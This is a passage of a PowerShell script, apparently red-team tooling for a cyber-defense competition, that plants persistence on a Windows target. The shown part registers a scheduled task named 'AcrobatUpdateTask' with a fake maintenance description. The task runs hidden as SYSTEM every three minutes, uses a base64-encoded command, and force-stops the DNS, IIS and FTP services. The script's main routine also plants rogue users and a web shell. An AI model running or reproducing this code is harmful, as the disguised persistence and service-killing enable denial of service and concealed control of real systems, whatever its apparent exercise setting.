        Write-Success "  Action   : Notepad opens '$Task1MessageFile'"
        Write-Success "  Runs as  : BUILTIN\Users (interactive session  -  Notepad will be visible)"
    } catch {
        Write-Err "Failed to register ${Task1Name}: $_"
    }

    Write-Host ""

    # ========== TASK 2: SillyServiceKiller ==========
    $Task2Name        = "AcrobatUpdateTask"
    $Task2Description = "Acrobat Update Services maintenance cleanup (system managed)"

    $Task2ScriptBlock = @'
$services = @('DNS','W3SVC','MSFTPSVC')
foreach ($svc in $services) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s -and $s.Status -eq 'Running') {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'@

    $Task2Encoded = [Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($Task2ScriptBlock)
    )

    $Task2Action  = New-ScheduledTaskAction `
        -Execute  "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task2Encoded"

    $Task2Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 3) `
        -RepetitionDuration ([System.TimeSpan]::MaxValue) `
        -Once -At (Get-Date).AddSeconds(30)

    $Task2Settings = New-ScheduledTaskSettingsSet `
        -ExecutionTimeLimit     (New-TimeSpan -Minutes 5) `
        -RestartCount           3 `
        -RestartInterval        (New-TimeSpan -Minutes 1) `
        -StartWhenAvailable     `
        -RunOnlyIfNetworkAvailable:$false

    $Task2Principal = New-ScheduledTaskPrincipal `
        -UserId    "SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel  Highest

    Write-Info "Registering scheduled task: $Task2Name ..."

    try {
        Unregister-ScheduledTask -TaskName $Task2Name -Confirm:$false -ErrorAction SilentlyContinue

        Register-ScheduledTask `
            -TaskName    $Task2Name `
            -Action      $Task2Action `
            -Trigger     $Task2Trigger `
            -Settings    $Task2Settings `
            -Principal   $Task2Principal `
            -Description $Task2Description `
            -Force | Out-Null

        Write-Success "Task registered: $Task2Name"
        Write-Success "  Schedule : every 3 minutes"
        Write-Success "  Action   : Stop-Service DNS, W3SVC (IIS), MSFTPSVC (FTP)"
        Write-Success "  Runs as  : SYSTEM"
    } catch {
        Write-Err "Failed to register ${Task2Name}: $_"
    }

    Write-Host ""
}

# =============================================================================
# MAIN
# =============================================================================
try {
    Invoke-TargetSetup
    Invoke-RogueUsers
    Invoke-RogueWebShell
    Invoke-ScheduledTasks

    Write-Section "ALL SECTIONS COMPLETE"
    Write-Success "Target setup, rogue users, web shell, and scheduled tasks are all planted."
    Write-Warn "Persistence (CCDC_Windows_Persistence_ClusterBombShells.ps1) was NOT run — run it separately if needed."
    Write-Host ""
} catch {
    Write-Err "Script failed: $_"
    exit 1
}
